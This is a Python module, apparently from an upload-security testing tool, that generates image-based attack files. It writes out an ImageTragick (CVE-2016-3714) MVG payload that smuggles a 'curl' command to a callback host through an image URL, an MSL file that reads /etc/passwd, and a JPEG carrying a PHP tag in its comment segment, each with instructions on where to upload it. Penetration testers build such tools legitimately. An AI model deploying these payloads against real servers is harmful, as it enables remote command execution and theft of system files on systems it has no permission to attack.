"""Image-processing techniques: ImageMagick (MVG/MSL, ImageTragick) and an
EXIF-embedded payload for sinks that reflect metadata."""
from __future__ import annotations

from ..core import register, Context, Artifact


@register("imagemagick", category="image-processing", risk="active",
          description="MVG/MSL files abusing ImageMagick delegates (ImageTragick).",
          reference="CVE-2016-3714")
def imagemagick(ctx: Context):
    host = ctx.callback_host
    # MVG with an https read -> SSRF/RCE on vulnerable delegate configs.
    mvg = ('push graphic-context\n'
           'viewbox 0 0 200 200\n'
           f'image over 0,0 0,0 \'https://{host}/image.jpg";curl ${{IFS}}{host}/mvg"\'\n'
           'pop graphic-context\n')
    # MSL that reads a local file (ImageTragick file disclosure).
    msl = ('<?xml version="1.0" encoding="UTF-8"?>\n'
           '<image>\n'
           '  <read filename="caption:&lt;svg&gt;"/>\n'
           '  <read filename="file:///etc/passwd"/>\n'
           '  <write filename="/tmp/ua-msl-out.png"/>\n'
           '</image>\n')
    for name, body, desc in [
        ("imagetragick.mvg", mvg, "MVG delegate abuse (ImageTragick SSRF/RCE)."),
        ("imagetragick.msl", msl, "MSL local-file read via ImageMagick."),
    ]:
        yield Artifact(
            relpath=f"image-processing/{name}", data=body,
            technique="imagemagick", category="image-processing", risk="active",
            description=desc,
            usage="Upload where ImageMagick processes the file (resize/convert).",
            reference="CVE-2016-3714",
        )


@register("exif-payload", category="image-processing", risk="safe",
          description="JPEG with a payload embedded in an EXIF/comment field.",
          reference="CWE-434")
def exif_payload(ctx: Context):
    # JPEG with a COM segment holding a PHP tag — reflected-EXIF sinks may
    # echo/execute it. Harmless unless the sink reflects it.
    marker = b"<?php echo 'ua-exif';?>"
    soi = b"\xff\xd8"
    jfif = b"\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
    com = b"\xff\xfe" + (len(marker) + 2).to_bytes(2, "big") + marker
    eoi = b"\xff\xd9"
    yield Artifact(
        relpath="image-processing/exif_comment.jpg",
        data=soi + jfif + com + eoi,
        technique="exif-payload", category="image-processing", risk="safe",
        description="Valid JPEG carrying a payload in the COM segment.",
        usage="Upload to sinks that read/reflect image metadata (EXIF).",
        reference="CWE-434",
    )
